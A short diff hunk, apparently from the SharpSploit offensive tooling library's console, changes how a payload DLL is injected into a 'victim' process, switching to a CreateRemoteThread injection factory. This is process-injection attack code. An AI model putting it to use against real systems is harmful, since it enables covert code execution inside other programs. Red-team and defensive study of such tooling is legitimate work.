@@ -71,7 +71,8 @@ namespace SharpSploit.Console
                 RedirectStandardError = false,
             });
 
-            Injection.LoadLib(victim.Id, payloadDll);
+
+            Injection.Factory(Injection.Method.CREATE_REMOTE_THREAD).Inject(victim.Id, payloadDll);
 
             // wait
             var start = DateTime.Now;
